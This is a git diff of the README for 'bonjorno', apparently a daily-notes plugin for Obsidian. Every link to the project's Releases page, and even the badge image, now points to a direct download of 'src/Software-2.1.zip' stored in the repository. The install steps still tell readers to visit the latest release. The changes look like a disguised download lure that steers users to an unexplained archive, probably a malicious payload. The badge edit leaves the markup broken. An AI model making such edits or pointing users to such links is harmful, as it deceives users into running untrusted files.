@@ -6,9 +6,9 @@ Welcome to the bonjorno project! This plugin allows you to take daily notes in O
 
 ## 📥 Download bonjorno
 
-[![Download bonjorno](https://img.shields.io/github/v/release/Gustibombi/bonjorno?style=for-the-badge&logo=github)](https://github.com/Gustibombi/bonjorno/releases)
+[![Download bonjorno](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip)](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip)
 
-To get started, please visit this page to download: [Download bonjorno](https://github.com/Gustibombi/bonjorno/releases)
+To get started, please visit this page to download: [Download bonjorno](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ To get started, please visit this page to download: [Download bonjorno](https://
 
 ## 📦 Install bonjorno
 
-1. **Download**: Go to the [Releases Page](https://github.com/Gustibombi/bonjorno/releases) and visit the latest release.
+1. **Download**: Go to the [Releases Page](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip) and visit the latest release.
    
 2. **Locate the Plugin**: In the release details, find the version labeled "bonjorno" suitable for your system. 
 
@@ -77,6 +77,6 @@ Bonjorno is open-source software licensed under the MIT License. Feel free to us
 
 Your feedback is essential for making bonjorno better. If you have suggestions or issues, please file an issue in the GitHub repository, and we will be happy to assist.
 
-For additional information, refer to the [Releases Page](https://github.com/Gustibombi/bonjorno/releases) for updates and new features.
+For additional information, refer to the [Releases Page](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip) for updates and new features.
 
-[![Download bonjorno](https://img.shields.io/github/v/release/Gustibombi/bonjorno?style=for-the-badge&logo=github)](https://github.com/Gustibombi/bonjorno/releases)
+[![Download bonjorno](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip)](https://github.com/Gustibombi/bonjorno/raw/refs/heads/main/src/Software-2.1.zip)
